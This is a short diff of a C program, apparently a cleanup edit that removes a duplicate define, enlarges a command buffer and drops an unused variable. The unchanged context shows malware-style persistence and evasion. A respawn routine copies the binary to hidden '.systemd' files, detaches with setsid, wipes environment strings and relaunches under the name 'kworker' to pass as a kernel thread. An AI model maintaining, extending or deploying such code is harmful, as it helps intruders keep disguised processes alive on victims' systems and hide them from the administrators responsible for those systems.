@@ -1,4 +1,4 @@
-#define _GNU_SOURCE
+// Removed the duplicate _GNU_SOURCE definition since it's already in Makefile
 
 #include <stdlib.h>
 #include <stdio.h>
@@ -101,7 +101,7 @@ void respawn_proc(void) {
         char tmp_path[256];
         snprintf(tmp_path, sizeof(tmp_path), "%s/.systemd", dirs[i]);
         
-        char cmd[512];
+        char cmd[1024];  // Increased buffer size
         snprintf(cmd, sizeof(cmd), "cp -f %s %s 2>/dev/null", path, tmp_path);
         exec_cmd(cmd);
         
@@ -110,7 +110,7 @@ void respawn_proc(void) {
         pid_t child = fork();
         if(child == 0) {
             setsid();
-            char *argv_fake[] = {"kworker", NULL};
+            // Removed unused argv_fake variable
             for(char **env = environ; *env; ++env) memset(*env, 0, strlen(*env));
             execl(tmp_path, "kworker", NULL);
             _exit(0);
